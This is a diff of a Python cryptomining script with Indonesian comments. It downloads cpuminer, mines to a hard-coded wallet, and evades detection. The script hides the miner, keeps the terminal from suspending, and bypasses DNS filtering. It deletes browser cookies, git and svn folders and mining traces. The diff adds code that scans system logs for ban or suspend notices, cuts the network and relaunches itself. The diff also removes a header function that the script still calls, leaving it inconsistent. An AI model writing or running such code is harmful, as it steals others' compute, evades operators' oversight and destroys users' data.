@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random
+import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket
 
-# Konfigurasi
+# Konfigurasi Miner
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
@@ -12,7 +12,7 @@ WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
 PASSWORD = "x"
 THREADS = os.cpu_count()
 
-# Durasi sesi dan cooldown
+# Durasi sesi mining dan cooldown
 MIN_DURATION = 300
 MAX_DURATION = 720
 MIN_PAUSE = 120
@@ -22,7 +22,7 @@ cooldown_restart_counter = 0
 cooldown_restart_limit = 3
 cooldown_reset_time = time.time() + 3600
 
-# Anti suspend terminal
+# Fungsi Anti Suspend (mencegah penghentian dari terminal)
 def anti_suspend():
     while True:
         try:
@@ -32,7 +32,7 @@ def anti_suspend():
             pass
         time.sleep(15)
 
-# DNS DoH Bypass
+# Fungsi DNS DoH Bypass
 def dns_doh_bypass():
     try:
         subprocess.call([
@@ -42,14 +42,49 @@ def dns_doh_bypass():
     except:
         pass
 
-# Deteksi penggunaan CPU
+# Fungsi deteksi CPU 100%
 def is_cpu_100_percent():
     try:
         return os.getloadavg()[0] >= os.cpu_count()
     except:
         return False
 
-# Putuskan koneksi internet
+# Fungsi untuk mendeteksi sistem yang diberhentikan atau diblokir
+def detect_system_threat():
+    print("[🛡️] Memeriksa potensi sistem diberhentikan/diblokir...")
+    suspicious_paths = [
+        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
+        "/etc/nologin", "/tmp/.X11-unix", "/proc/sys/kernel/hung_task_timeout_secs"
+    ]
+    for path in suspicious_paths:
+        if os.path.exists(path):
+            try:
+                with open(path, "r", errors="ignore") as f:
+                    content = f.read().lower()
+                    if any(k in content for k in ["suspend", "dismiss", "ban", "blocked", "terminated"]):
+                        print(f"[🚫] Sistem diblokir: {path}")
+                        subprocess.call(["nmcli", "networking", "off"])
+                        time.sleep(3)
+                        os.execv(sys.executable, [sys.executable] + sys.argv)
+            except:
+                continue
+
+# Fungsi untuk bypass firewall
+def firewall_bypass():
+    print("[🔥] Menjalankan firewall bypass...")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect(("1.1.1.1", 443))
+        s.close()
+    except:
+        pass
+    try:
+        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        pass
+
+# Fungsi untuk memutuskan jaringan internet
 def disconnect_network():
     print("[🔌] Memutus koneksi jaringan...")
     try:
@@ -61,7 +96,7 @@ def disconnect_network():
         except:
             pass
 
-# Aktifkan kembali koneksi
+# Fungsi untuk menghubungkan jaringan internet kembali
 def reconnect_network():
     print("[🌐] Mengaktifkan koneksi jaringan...")
     try:
@@ -73,16 +108,7 @@ def reconnect_network():
         except:
             pass
 
-# Evaluasi restart
-def should_restart():
-    global cooldown_restart_counter, cooldown_reset_time
-    if time.time() > cooldown_reset_time:
-        cooldown_restart_counter = 0
-        cooldown_reset_time = time.time() + 3600
-    cooldown_restart_counter += 1
-    return cooldown_restart_counter <= cooldown_restart_limit
-
-# Pembersih jejak browser dan mining
+# Fungsi untuk membersihkan jejak browser (cookies)
 def clean_browser_cookies():
     for path in [
         "~/.config/google-chrome/Default/Cookies",
@@ -100,6 +126,7 @@ def clean_browser_cookies():
             except:
                 pass
 
+# Fungsi untuk membersihkan jejak tracking
 def clean_tracking_artifacts():
     for path in [
         "~/.cache/tracker", "~/.config/.tracking"
@@ -112,6 +139,7 @@ def clean_tracking_artifacts():
             except:
                 pass
 
+# Fungsi untuk membersihkan data aplikasi
 def clean_myapp_data():
     for path in [
         "~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"
@@ -124,6 +152,7 @@ def clean_myapp_data():
             except:
                 pass
 
+# Fungsi untuk membersihkan jejak source control (Git, SVN, dll)
 def clean_source_control():
     for base in ["~", "~/Downloads", "~/.cache", "~/.local/share"]:
         for root, dirs, _ in os.walk(os.path.expanduser(base)):
@@ -136,6 +165,7 @@ def clean_source_control():
                     except:
                         pass
 
+# Fungsi untuk membersihkan file mining
 def clean_mining_artifacts():
     for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
         for root, _, files in os.walk(os.path.expanduser(base)):
@@ -147,22 +177,7 @@ def clean_mining_artifacts():
                     except:
                         pass
 
-def clean_miner_cache():
-    try:
-        if os.path.exists(TARFILE): os.remove(TARFILE)
-        if os.path.exists(HIDDEN_DIR): shutil.rmtree(HIDDEN_DIR)
-    except: pass
-
-def fake_http_headers():
-    headers = [
-        "User-Agent: Mozilla/5.0",
-        "Accept: */*",
-        "Referer: https://google.com/",
-        "X-Forwarded-For: 127.0.0.1"
-    ]
-    os.environ["FAKE_HEADERS"] = "|".join(headers)
-
-# Menjalankan satu sesi penambangan
+# Fungsi untuk menjalankan satu sesi penambangan
 def run_one_session():
     os.makedirs(HIDDEN_DIR, exist_ok=True)
     urllib.request.urlretrieve(URL, TARFILE)
@@ -193,7 +208,7 @@ def run_one_session():
             else: return
     proc.terminate()
 
-# Loop utama
+# Fungsi utama yang menjalankan proses berulang
 def main_loop():
     while True:
         clean_mining_artifacts()
@@ -202,7 +217,7 @@ def main_loop():
         print(f"[⏸️] Istirahat {pause} detik...\n")
         time.sleep(pause)
 
-# Restart script
+# Fungsi untuk merestart script
 def restart_script():
     try:
         print("[🔁] Restarting...")
@@ -226,6 +241,9 @@ if __name__ == "__main__":
     fake_http_headers()
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
+    threading.Thread(target=detect_system_threat, daemon=True).start()
+    threading.Thread(target=firewall_bypass, daemon=True).start()
+    print("[🚀] Deteksi ancaman & bypass firewall aktif.")
     try:
         main_loop()
     except KeyboardInterrupt:
